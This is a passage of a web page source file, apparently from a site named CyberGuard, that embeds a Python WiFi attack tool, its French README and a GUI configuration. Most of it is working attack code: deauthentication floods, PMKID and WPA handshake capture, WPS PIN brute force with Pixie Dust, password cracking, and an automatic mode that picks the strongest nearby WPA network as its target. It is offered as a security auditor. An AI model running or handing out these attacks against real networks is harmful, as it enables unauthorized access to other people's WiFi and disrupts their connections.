        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    time.sleep(3)
    
    # Send deauth packets
    print(f"  {C['Y']}[*]{C['X']} Sending {deauth_count} deauth packets...")
    for i in range(deauth_count):
        subprocess.run(
            ["aireplay-ng", "--deauth", "5", "-a", bssid, iface],
            capture_output=True, timeout=10
        )
        time.sleep(2)
        
        # Check if handshake captured
        check = subprocess.run(
            ["aircrack-ng", cap_file + "-01.cap"],
            capture_output=True, text=True, timeout=5
        )
        if "1 handshake" in check.stdout:
            print(f"  {C['G']}{C['BOLD']}[+] Handshake captured!{C['X']}")
            airodump.terminate()
            return cap_file + "-01.cap"
    
    airodump.terminate()
    
    cap_path = cap_file + "-01.cap"
    if os.path.exists(cap_path):
        print(f"  {C['Y']}[*]{C['X']} Capture saved to {cap_path}")
        return cap_path
    
    print(f"  {C['R']}[-]{C['X']} No handshake captured within timeout")
    return None

# ══════════════════════════════════════════════════════════════════════
# PMKID ATTACK (Clientless)
# ══════════════════════════════════════════════════════════════════════

def pmkid_attack(iface, bssid, channel=None, timeout=30):
    \"\"\"PMKID capture — no client needed, extracts from first EAPOL message.\"\"\"
    print(f"\\n{C['C']}[PMKID] Target: {bssid}{C['X']}")
    
    if channel:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True)
    
    # Use hcxdumptool if available, otherwise manual approach
    hcx_available = subprocess.run(["which", "hcxdumptool"], capture_output=True).returncode == 0
    
    if hcx_available:
        print(f"  {C['C']}[*]{C['X']} Using hcxdumptool for PMKID capture...")
        outfile = f"/tmp/pmkid_{bssid.replace(':', '')}"
        
        # Create filter file
        with open("/tmp/pmkid_filter", "w") as f:
            f.write(bssid.replace(":", "").lower())
        
        proc = subprocess.Popen(
            ["hcxdumptool", "-i", iface, "-o", outfile + ".pcapng",
             "--filterlist_ap=/tmp/pmkid_filter", "--filtermode=2",
             "--enable_status=1"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        
        time.sleep(timeout)
        proc.terminate()
        
        # Convert to hash format
        if os.path.exists(outfile + ".pcapng"):
            subprocess.run(
                ["hcxpcapngtool", "-o", outfile + ".22000", outfile + ".pcapng"],
                capture_output=True
            )
            if os.path.exists(outfile + ".22000"):
                print(f"  {C['G']}[+]{C['X']} PMKID hash saved: {outfile}.22000")
                return outfile + ".22000"
    
    print(f"  {C['Y']}[*]{C['X']} Manual PMKID extraction (basic)...")
    print(f"  {C['Y']}[*]{C['X']} Install hcxdumptool for better results: sudo apt install hcxdumptool hcxtools")
    return None

# ══════════════════════════════════════════════════════════════════════
# WPS PIN BRUTEFORCE
# ══════════════════════════════════════════════════════════════════════

def wps_bruteforce(iface, bssid, channel=None, pixie_dust=True, timeout=600):
    \"\"\"WPS PIN brute force — Reaver-style with Pixie Dust support.\"\"\"
    print(f"\\n{C['C']}[WPS] Target: {bssid}{C['X']}")
    
    reaver_available = subprocess.run(["which", "reaver"], capture_output=True).returncode == 0
    bully_available = subprocess.run(["which", "bully"], capture_output=True).returncode == 0
    
    if not reaver_available and not bully_available:
        print(f"  {C['R']}[!]{C['X']} Neither reaver nor bully found")
        print(f"      Install: sudo apt install reaver bully")
        return None
    
    cmd_tool = "reaver" if reaver_available else "bully"
    
    if pixie_dust and reaver_available:
        print(f"  {C['C']}[*]{C['X']} Trying Pixie Dust attack first...")
        try:
            r = subprocess.run(
                ["reaver", "-i", iface, "-b", bssid, "-K", "1", "-vv"],
                capture_output=True, text=True, timeout=120
            )
            pin_match = re.search(r"WPS PIN:\\s*'?(\\d{8})'?", r.stdout)
            key_match = re.search(r"WPA PSK:\\s*'([^']+)'", r.stdout)
            if pin_match and key_match:
                print(f"  {C['G']}{C['BOLD']}[+] Pixie Dust SUCCESS!{C['X']}")
                print(f"  {C['G']}PIN: {pin_match.group(1)}{C['X']}")
                print(f"  {C['G']}KEY: {key_match.group(1)}{C['X']}")
                return key_match.group(1)
        except subprocess.TimeoutExpired:
            print(f"  {C['Y']}[*]{C['X']} Pixie Dust timed out, falling back to bruteforce...")
    
    # Full PIN bruteforce
    print(f"  {C['C']}[*]{C['X']} Starting PIN bruteforce with {cmd_tool}...")
    cmd = [cmd_tool, "-i", iface, "-b", bssid, "-vv"]
    if channel and reaver_available:
        cmd.extend(["-c", str(channel)])
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        start = time.time()
        while time.time() - start < timeout:
            line = proc.stdout.readline()
            if not line:
                break
            if "WPS PIN" in line or "WPA PSK" in line:
                print(f"  {C['G']}{line.strip()}{C['X']}")
            elif "rate limiting" in line.lower() or "locked" in line.lower():
                print(f"  {C['Y']}[!]{C['X']} AP rate limiting detected — waiting...")
                time.sleep(60)
        
        proc.terminate()
    except Exception as e:
        print(f"  {C['R']}[!]{C['X']} WPS error: {e}")
    
    return None

# ══════════════════════════════════════════════════════════════════════
# AUTO MODE (Full pipeline)
# ══════════════════════════════════════════════════════════════════════

def auto_mode(iface, target_ssid=None, wordlist_path=None, threads=8):
    \"\"\"Automated full pipeline: scan -> capture -> crack.\"\"\"
    print(f"\\n{C['M']}{C['BOLD']}[AUTO] Full automated audit pipeline{C['X']}")
    
    # Step 1: Scan
    networks = scan_networks(iface, duration=10)
    if not networks:
        print(f"  {C['R']}[!]{C['X']} No networks found")
        return
    
    # Step 2: Select target
    target = None
    if target_ssid:
        target = next((n for n in networks if n["essid"] == target_ssid), None)
    if not target:
        # Select strongest WPA network
        wpa_nets = [n for n in networks if "WPA" in n["encryption"]]
        if wpa_nets:
            target = max(wpa_nets, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else -999)
    
    if not target:
        print(f"  {C['R']}[!]{C['X']} No suitable target found")
        return
    
    print(f"\\n  {C['BOLD']}Target:{C['X']} {target['essid']} ({target['bssid']}) CH:{target['channel']}")
    
    # Step 3: Try PMKID first (clientless, faster)
    pmkid_file = pmkid_attack(iface, target["bssid"], target["channel"], timeout=15)
    
    # Step 4: Capture handshake if PMKID failed
    cap_file = None
    if not pmkid_file:
        cap_file = capture_handshake(iface, target["bssid"], int(target["channel"]))
    
    handshake_file = pmkid_file or cap_file
    if not handshake_file:
        print(f"  {C['R']}[!]{C['X']} Could not capture handshake or PMKID")
        return
    
    # Step 5: Load handshake
    handshake = load_handshake(handshake_file)
    if not handshake.ssid:
        handshake.ssid = target["essid"]
    
    # Step 6: Try WPS if available
    if target.get("wps"):
        key = wps_bruteforce(iface, target["bssid"], int(target["channel"]))
        if key:
            return key
    
    # Step 7: Smart wordlist + dictionary attack
    if wordlist_path:
        with open(wordlist_path, "r", errors="replace") as f:
            wordlist = [line.strip() for line in f if 8 <= len(line.strip()) <= 63]
    else:
        print(f"  {C['C']}[*]{C['X']} No wordlist provided, generating smart wordlist from SSID...")
        wordlist = generate_smart_wordlist(target["essid"])
    
    return crack_handshake(handshake, wordlist=wordlist, threads=threads)

# ════════════════════════════════════════════════════════════��═════════
# CLI
# ══════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="WiFi BruteForce - CyberGuard WiFi Security Auditor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=\"\"\"
Examples:
  sudo python wifi_bruteforce.py scan
  sudo python wifi_bruteforce.py scan -i wlan0
  sudo python wifi_bruteforce.py capture --bssid AA:BB:CC:DD:EE:FF -c 6
  sudo python wifi_bruteforce.py pmkid --bssid AA:BB:CC:DD:EE:FF
  sudo python wifi_bruteforce.py wps --bssid AA:BB:CC:DD:EE:FF
  sudo python wifi_bruteforce.py crack handshake.cap -w rockyou.txt -t 8
  sudo python wifi_bruteforce.py crack handshake.cap --smart-wordlist --ssid MyWifi
  sudo python wifi_bruteforce.py auto --target MyWifi
  sudo python wifi_bruteforce.py auto --target MyWifi -w rockyou.txt
        \"\"\"
    )
    
    subparsers = parser.add_subparsers(dest="mode", help="Attack mode")
    
    # Scan
    scan_p = subparsers.add_parser("scan", help="Scan WiFi networks")
    scan_p.add_argument("-i", "--interface", default=None, help="WiFi interface")
    scan_p.add_argument("-d", "--duration", type=int, default=15, help="Scan duration (seconds)")
    
    # Capture
    cap_p = subparsers.add_parser("capture", help="Capture WPA handshake")
    cap_p.add_argument("--bssid", required=True, help="Target BSSID")
    cap_p.add_argument("-c", "--channel", type=int, required=True, help="Channel")
    cap_p.add_argument("-i", "--interface", default=None, help="WiFi interface")
    cap_p.add_argument("-o", "--output", default="handshake", help="Output file prefix")
    cap_p.add_argument("--deauth", type=int, default=10, help="Deauth rounds")
    
    # PMKID
    pmkid_p = subparsers.add_parser("pmkid", help="PMKID attack (clientless)")
    pmkid_p.add_argument("--bssid", required=True, help="Target BSSID")
    pmkid_p.add_argument("-c", "--channel", type=int, default=None, help="Channel")
    pmkid_p.add_argument("-i", "--interface", default=None, help="WiFi interface")
    
    # WPS
    wps_p = subparsers.add_parser("wps", help="WPS PIN bruteforce")
    wps_p.add_argument("--bssid", required=True, help="Target BSSID")
    wps_p.add_argument("-c", "--channel", type=int, default=None, help="Channel")
    wps_p.add_argument("-i", "--interface", default=None, help="WiFi interface")
    wps_p.add_argument("--no-pixie", action="store_true", help="Skip Pixie Dust")
    
    # Crack
    crack_p = subparsers.add_parser("crack", help="Crack handshake")
    crack_p.add_argument("capture_file", help="Capture file (.cap/.pcap/.hccapx/.22000)")
    crack_p.add_argument("-w", "--wordlist", help="Wordlist file")
    crack_p.add_argument("-t", "--threads", type=int, default=8, help="Threads")
    crack_p.add_argument("--no-mutations", action="store_true", help="Disable mutations")
    crack_p.add_argument("--smart-wordlist", action="store_true", help="Generate smart wordlist")
    crack_p.add_argument("--ssid", help="SSID for smart wordlist")
    
    # Auto
    auto_p = subparsers.add_parser("auto", help="Full auto pipeline")
    auto_p.add_argument("--target", help="Target SSID")
    auto_p.add_argument("-w", "--wordlist", help="Wordlist file")
    auto_p.add_argument("-t", "--threads", type=int, default=8, help="Threads")
    auto_p.add_argument("-i", "--interface", default=None, help="WiFi interface")
    
    args = parser.parse_args()
    
    if not args.mode:
        parser.print_help()
        return
    
    banner()
    
    # Get interface
    iface = getattr(args, "interface", None)
    needs_monitor = args.mode in ("scan", "capture", "pmkid", "wps", "auto")
    
    if needs_monitor:
        check_root()
        deps = check_deps()
        
        if not iface:
            ifaces = get_wireless_interfaces()
            if not ifaces:
                print(f"  {C['R']}[!]{C['X']} No wireless interface found")
                return
            iface = ifaces[0]
            print(f"  {C['C']}[*]{C['X']} Using interface: {iface}")
        
        mon_iface = enable_monitor_mode(iface)
    
    try:
        if args.mode == "scan":
            scan_networks(mon_iface, args.duration)
        
        elif args.mode == "capture":
            cap = capture_handshake(mon_iface, args.bssid, args.channel, args.output, deauth_count=args.deauth)
            if cap:
                print(f"\\n  {C['G']}[+]{C['X']} Handshake saved: {cap}")
        
        elif args.mode == "pmkid":
            pmkid_attack(mon_iface, args.bssid, args.channel)
        
        elif args.mode == "wps":
            wps_bruteforce(mon_iface, args.bssid, args.channel, pixie_dust=not args.no_pixie)
        
        elif args.mode == "crack":
            hs = load_handshake(args.capture_file)
            
            wordlist = None
            if args.smart_wordlist:
                ssid = args.ssid or hs.ssid
                if ssid:
                    print(f"  {C['C']}[*]{C['X']} Generating smart wordlist for SSID: {ssid}")
                    wordlist = generate_smart_wordlist(ssid)
                    print(f"  {C['G']}[+]{C['X']} {len(wordlist)} smart candidates generated")
                else:
                    print(f"  {C['R']}[!]{C['X']} No SSID for smart wordlist (use --ssid)")
                    return
            
            result = crack_handshake(
                hs,
                wordlist_path=args.wordlist if not wordlist else None,
                wordlist=wordlist,
                threads=args.threads,
                mutations=not args.no_mutations,
            )
            
            if result:
                # Save to .pot file
                pot_file = args.capture_file.rsplit(".", 1)[0] + ".pot"
                with open(pot_file, "w") as f:
                    f.write(f"{hs.ssid}:{result}\\n")
                print(f"  {C['G']}[+]{C['X']} Key saved: {pot_file}")
        
        elif args.mode == "auto":
            auto_mode(mon_iface, args.target, args.wordlist, args.threads)
    
    finally:
        if needs_monitor:
            disable_monitor_mode(mon_iface)

if __name__ == "__main__":
    main()
`;

const README = `# WiFi BruteForce - CyberGuard WiFi Security Auditor
Outil d'audit de securite WiFi multi-modules. Inspire de Aircrack-ng + Hashcat + Wifite + hcxtools + Reaver.

## 6 Modes d'attaque
- **scan** - Decouverte des reseaux WiFi
- **capture** - Capture 4-way handshake WPA/WPA2 (deauth + sniff)
- **pmkid** - Attaque PMKID clientless
- **wps** - Bruteforce WPS PIN (Reaver-style + Pixie Dust)
- **crack** - Cracking PBKDF2-SHA1 multi-thread + mutations hashcat
- **auto** - Pipeline complet automatise

## Pre-requis
\`\`\`bash
sudo apt install aircrack-ng reaver bully hcxdumptool hcxtools iw
\`\`\`

## Carte WiFi compatible (mode monitor)
- Atheros AR9271 (TP-Link TL-WN722N v1)
- Ralink RT3070 (Alfa AWUS036NHA)  
- Realtek RTL8812AU (Alfa AWUS036ACH)

## Utilisation
\`\`\`bash
sudo python wifi_bruteforce.py scan
sudo python wifi_bruteforce.py capture --bssid AA:BB:CC:DD:EE:FF -c 6
sudo python wifi_bruteforce.py crack handshake.cap -w rockyou.txt -t 8
sudo python wifi_bruteforce.py crack handshake.cap --smart-wordlist --ssid MyWifi
sudo python wifi_bruteforce.py auto --target MyWifi
\`\`\`

## Mutations (50+ regles hashcat-style)
toggle case, reverse, duplicate, append digits/specials, l33t speak,
capitalize, date append, keyboard walks, combinator...

Cree par CyberGuard — https://cyber-guard-dusky.vercel.app
`;

const GUI_CONFIG: GuiConfig = {
  title: "WiFi BruteForce Auditor",
  inputType: "text",
  inputPlaceholder: "handshake.cap (chemin du fichier capture)",
  buttonText: "Cracker",
  importLine: "from wifi_bruteforce import load_handshake, crack_handshake, generate_smart_wordlist",
  processCode: `            hs = load_handshake(inp)
            wl = generate_smart_wordlist(hs.ssid)
            result = crack_handshake(hs, wordlist=wl, threads=4)
            return {"ssid": hs.ssid, "key": result, "candidates": len(wl)}`,
};

export function WifiBruteForcePage() {
  return (
    <ToolPageLayout
      title="WiFi" subtitle="BruteForce"
      description="Outil d'audit de sécurité WiFi multi-modules. 6 modes d'attaque : scan réseau, capture handshake WPA/WPA2, attaque PMKID clientless, WPS PIN bruteforce (Pixie Dust + Reaver), cracking PBKDF2-SHA1 multi-threadé avec mutations hashcat-style (50+ règles), pipeline full auto. Inspiré d'Aircrack-ng + Hashcat + Wifite + hcxtools."
      toolSlug="wifi_bruteforce"
      icon={Wifi}
      color="#8b5cf6"
      hubAnchor="wifi-bruteforce"
      disableOnlineTest={true}
      features={[
        { icon: Radio, title: "Scan & Capture", desc: "Scan réseaux (airodump-ng), passage mode monitor, deauth ciblé multi-client, capture automatique 4-way handshake WPA/WPA2." },
        { icon: Key, title: "PMKID Attack", desc: "Attaque clientless — aucun client connecté nécessaire. Extraction PMKID depuis RSN IE du premier message EAPOL. Via hcxdumptool." },
        { icon: Target, title: "WPS PIN Bruteforce", desc: "Reaver-style PIN split (11K essais vs 100M). Pixie Dust attack en priorité. Détection du rate-limiting AP." },
        { icon: Hash, title: "Cracking Engine", desc: "PBKDF2-SHA1 4096 itérations, multi-threadé (auto-détect CPU). Supporte .cap/.pcap/.hccapx/.22000. ~5000 PMK/s Python, ~100K C." },
        { icon: Layers, title: "50+ Mutations Hashcat", desc: "Toggle case, reverse, duplicate, append digits/specials, l33t speak, capitalize, date append, keyboard walks, combinator." },
        { icon: Database, title: "Smart Wordlist Gen", desc: "Génération intelligente basée sur le SSID (analyse sémantique), patterns courants, keyboard walks, dates, l33t speak." },
        { icon: Gauge, title: "Full Auto Pipeline", desc: "Scan → PMKID → Handshake → WPS → Smart wordlist → Dictionary → Crack. Tout automatisé avec rapport final." },
        { icon: Shield, title: "Multi-format Support", desc: "Import .cap, .pcap, .hccapx (hashcat), .22000 (hashcat). Export .pot (cracked keys), JSON rapport, handshake files." },
      ]}
      requirements={[
        "Python 3.7+ (aucune dépendance externe)",
        "Linux avec carte WiFi mode monitor (Atheros/Ralink/Realtek)",
        "sudo / root requis",
        "Optionnel: aircrack-ng, reaver, bully, hcxdumptool, hcxtools",
      ]}
      pythonScript={PYTHON_SCRIPT}
      readmeContent={README}
      guiConfig={GUI_CONFIG}
    >
      <WifiBruteForceInfo />
    </ToolPageLayout>
  );
}
